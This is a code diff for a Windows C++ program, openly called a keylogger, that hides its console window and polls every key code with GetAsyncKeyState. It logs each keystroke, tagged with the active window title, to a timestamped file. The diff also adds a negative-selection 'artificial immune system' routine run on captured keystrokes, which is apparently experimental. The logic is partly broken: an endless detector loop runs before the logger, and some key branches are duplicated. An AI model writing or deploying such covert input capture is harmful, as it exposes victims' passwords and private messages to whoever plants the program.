@@ -20,16 +20,21 @@
 
 
 #include "main.h"
-#define DEBUG
 
 using namespace std;
+
+void getNameOutputFile(char *filepath);
+string shortTitle(char *title);
+int keyPressed();
+void detectorAIS();
+void keylogger();
 
 int main(int argc, char *argv[]){
 	printf("%s %d.%d.%d (%s %s)\n", PROJECT_NAME, PROJECT_VERSION_MAJOR, PROJECT_VERSION_MINOR, PROJECT_VERSION_PATCH, __DATE__, __TIME__);
 	puts(PROJECT_COPYRIGHT);
 	puts("");
-	
-#ifndef DEBUG
+	detectorAIS();
+#ifndef TEST
 	char path[260];
 
     GetModuleFileName(NULL,path,260);
@@ -40,6 +45,54 @@ int main(int argc, char *argv[]){
 
     ShowWindow(console,SW_HIDE); // hides the 
 #endif 
+	//SHORT lastc = 0;
+	char filepath[MAX_PATH];
+	getNameOutputFile(filepath);
+	ofstream klogout(filepath);
+	
+	string title,lastTitle = "";
+	
+	while(1){
+		Sleep(2); // give other programs time to run
+		
+		// get the active windowtitle
+		char stitle[1024];
+		
+		HWND hwndHandle = GetForegroundWindow();
+		GetWindowText(hwndHandle, stitle, 1023);
+		title=shortTitle(stitle);
+		if(lastTitle != title){		
+			if(title.size() == 0){
+				klogout << endl << "NO_ACTIVE ";
+#ifdef DEBUG
+				cout << endl << "NO_ACTIVE ";
+#endif
+			}else{
+				klogout << endl << title <<" ";
+#ifdef DEBUG
+				cout << endl << title <<" ";
+#endif
+			}
+			lastTitle = title;
+		}
+		
+		// logging keys, thats the keylogger
+		int c = keyPressed();
+				
+		if(c!=0){
+			klogout << (short)c<<" " ;
+			klogout.flush();
+		}
+				
+				//lastc = c;
+	}
+	
+	klogout.close();
+	
+	return 0;
+}
+
+void getNameOutputFile(char *filepath){
 	string basepath = dirBasename(getSelfPath());
 	
 	time_t rawtime;
@@ -47,154 +100,167 @@ int main(int argc, char *argv[]){
 	time(&rawtime);
 	timeinfo = localtime(&rawtime);
 	char filename[MAX_PATH];
-	char filepath[MAX_PATH];
+	
 	strftime(filename, 100, "%Y-%m-%d_%H-%M-%S", timeinfo);
 	sprintf(filepath, "%s\\%s%s", basepath.c_str(), filename, FILEEXT);
+}
+string shortTitle(char *ptitle){
+	int lentitle,i;
 	
-	//printf("filepath '%s'\n", filepath); exit(0);
+	lentitle=strlen(ptitle);
+	for (i = lentitle; i >=0 ; i--)
+		if(ptitle[i]==' '){
+			break;
+		}
+	ptitle = ptitle+i+1;
+	return string(ptitle);
+}
+int keyPressed(){
+	unsigned char c;
+	for(c = 1; c < 255; c++){
+		SHORT rv = GetAsyncKeyState(c);
+		if(rv & 1){ // on press button down
+			string out = "";
+			if(c == 1){
+				out = "";c=0;}
+			else if(c == 2){
+				out = "";c=0;}
+			else if(c == 32){ //space
+				cout<<"\n";c=0;}
+			else if(c == 13){ //return
+				out = "\n";c=0;}
+			else if(c == 16 || c == 17 || c == 18){
+				out = "";c=0;}
+			else if(c == 160 || c == 161) // lastc == 16
+				out = "[SHIFT]";
+			else if(c == 162 || c == 163) // lastc == 17
+				out = "[CTRL]";
+			else if(c == 164) // lastc == 18
+				out = "[ALT]";
+			else if(c == 165)
+				out = "[ALT GR]";
+			else if(c == 8)
+				out = "[BACKSPACE]";
+			else if(c == 9)
+				out = "[TAB]";
+			else if(c == 27)
+				out = "[ESC]";
+			else if(c == 33)
+				out = "[PAGE UP]";
+			else if(c == 34)
+				out = "[PAGE DOWN]";
+			else if(c == 35)
+				out = "[HOME]";
+			else if(c == 36)
+				out = "[POS1]";
+			else if(c == 37)
+				out = "[ARROW LEFT]";
+			else if(c == 38)
+				out = "[ARROW UP]";
+			else if(c == 39)
+				out = "[ARROW RIGHT]";
+			else if(c == 40)
+				out = "[ARROW DOWN]";
+			else if(c == 45)
+				out = "[INS]";
+			else if(c == 46)
+				out = "[DEL]";
+			else if((c >= 65 && c <= 90)
+				|| (c >= 48 && c <= 57)
+					|| c == 32)
+					out = c;
+			else if(c == 91 || c == 92)
+				out = "[WIN]";
+			else if(c >= 96 && c <= 105)
+				out = intToString(c - 96);
+			else if(c == 106)
+				out = "/";
+			else if(c == 107)
+				out = "+";
+			else if(c == 108)
+				out = "-";
+			else if(c == 109)
+				out = ",";
+			else if(c >= 112 && c <= 123)
+				out = "[F" + intToString(c - 111) + "]";
+			else if(c == 144)
+				out = "[NUM]";
+			else if(c == 192)
+				out = "[OE]";
+			else if(c == 222)
+				out = "[AE]";
+			else if(c == 186)
+				out = "[UE]";
+			else if(c == 186)
+				out = "+";
+			else if(c == 188)
+				out = ",";
+			else if(c == 189)
+				out = "-";
+			else if(c == 190)
+				out = ".";
+			else if(c == 191)
+				out = "#";
+			else if(c == 226)
+				out = "<";
+			else{
+				out = "["+intToString(c)+"]";
+				c=0;
+			}
+		#ifdef DEBUG
+			cout << out;
+		#endif
+		return c;
+		}
+	}
+	return 0;
+}
+
+void detectorAIS(){
+	map<string,vector<int> > self;
+	map<int,string> keys;
+	string title,lastTitle,url = "";
+	int tamMuestra,lenPalabra;
+	vector<int> currentInput;
 	
+	readData(url,self);
 	
-	string lastTitle = "";
-	ofstream klogout(filepath);
+	keys = getKeys();
 	
-	//SHORT lastc = 0;
+	int r,detectorSize,strSize;
+	
+	r=5;
+	detectorSize=100;
+	strSize=10;
+	tamMuestra=200;
+	
 	while(1){
 		Sleep(2); // give other programs time to run
 		
 		// get the active windowtitle
-		char title[1024];
+		char stitle[1024];
+		
 		HWND hwndHandle = GetForegroundWindow();
-		GetWindowText(hwndHandle, title, 1023);
-		if(lastTitle != title){
-			klogout << endl << endl << "Window: ";
-#ifdef DEBUG
-			cout << endl << endl << "Window: ";
-#endif
-			if(strlen(title) == 0){
-				klogout << "NO ACTIVE WINDOW";
-#ifdef DEBUG
-				cout << "NO ACTIVE WINDOW";
-#endif
-			}
-			else{
-				klogout << "'" << title << "'";
-#ifdef DEBUG
-				cout << "'" << title << "'";
-#endif
-			}
-			klogout << endl;
-#ifdef DEBUG
-			cout << endl;
-#endif
-			
+		GetWindowText(hwndHandle, stitle, 1023);
+		title=shortTitle(stitle);
+		if(lastTitle != title){		
 			lastTitle = title;
+//			Detection time
+			currentInput = obtenerMuestra(currentInput,tamMuestra,lenPalabra);
+			GenericNegativeSelection gns(r,detectorSize,strSize);
+
+			vector<string> nonself = gns.negativeSelectionAlgorithm( convertir(self) );
+			for(string i:nonself){
+				cout<<i;
+			}cout<<endl;
 		}
 		
 		// logging keys, thats the keylogger
-		for(unsigned char c = 1; c < 255; c++){
-			SHORT rv = GetAsyncKeyState(c);
-			if(rv & 1){ // on press button down
-				string out = "";
-				if(c == 1)
-					out = "[LMOUSE]"; // mouse left
-				else if(c == 2)
-					out = "[RMOUSE]"; // mouse right
-				else if(c == 4)
-					out = "[MMOUSE]"; // mouse middle
-				else if(c == 13)
-					out = "[RETURN]";
-				else if(c == 16 || c == 17 || c == 18)
-					out = "";
-				else if(c == 160 || c == 161) // lastc == 16
-					out = "[SHIFT]";
-				else if(c == 162 || c == 163) // lastc == 17
-					out = "[STRG]";
-				else if(c == 164) // lastc == 18
-					out = "[ALT]";
-				else if(c == 165)
-					out = "[ALT GR]";
-				else if(c == 8)
-					out = "[BACKSPACE]";
-				else if(c == 9)
-					out = "[TAB]";
-				else if(c == 27)
-					out = "[ESC]";
-				else if(c == 33)
-					out = "[PAGE UP]";
-				else if(c == 34)
-					out = "[PAGE DOWN]";
-				else if(c == 35)
-					out = "[HOME]";
-				else if(c == 36)
-					out = "[POS1]";
-				else if(c == 37)
-					out = "[ARROW LEFT]";
-				else if(c == 38)
-					out = "[ARROW UP]";
-				else if(c == 39)
-					out = "[ARROW RIGHT]";
-				else if(c == 40)
-					out = "[ARROW DOWN]";
-				else if(c == 45)
-					out = "[INS]";
-				else if(c == 46)
-					out = "[DEL]";
-				else if((c >= 65 && c <= 90)
-					|| (c >= 48 && c <= 57)
-					|| c == 32)
-					out = c;
+		int c = keyPressed();
 				
-				else if(c == 91 || c == 92)
-					out = "[WIN]";
-				else if(c >= 96 && c <= 105)
-					out = "[NUM " + intToString(c - 96) + "]";
-				else if(c == 106)
-					out = "[NUM /]";
-				else if(c == 107)
-					out = "[NUM +]";
-				else if(c == 109)
-					out = "[NUM -]";
-				else if(c == 109)
-					out = "[NUM ,]";
-				else if(c >= 112 && c <= 123)
-					out = "[F" + intToString(c - 111) + "]";
-				else if(c == 144)
-					out = "[NUM]";
-				else if(c == 192)
-					out = "[OE]";
-				else if(c == 222)
-					out = "[AE]";
-				else if(c == 186)
-					out = "[UE]";
-				else if(c == 186)
-					out = "+";
-				else if(c == 188)
-					out = ",";
-				else if(c == 189)
-					out = "-";
-				else if(c == 190)
-					out = ".";
-				else if(c == 191)
-					out = "#";
-				else if(c == 226)
-					out = "<";
-				
-				else
-					out = "[KEY \\" + intToString(c) + "]";
-				
-#ifdef DEBUG
-				cout << ">" << out << "< (" << (unsigned)c << ")" << endl;
-#endif
-				klogout << out;
-				klogout.flush();
-				
-				//lastc = c;
-			}
+		if(c!=0){
+			currentInput.push_back(c);
 		}
-		
 	}
-	
-	klogout.close();
-	
-	return 0;
 }
+void keylogger();
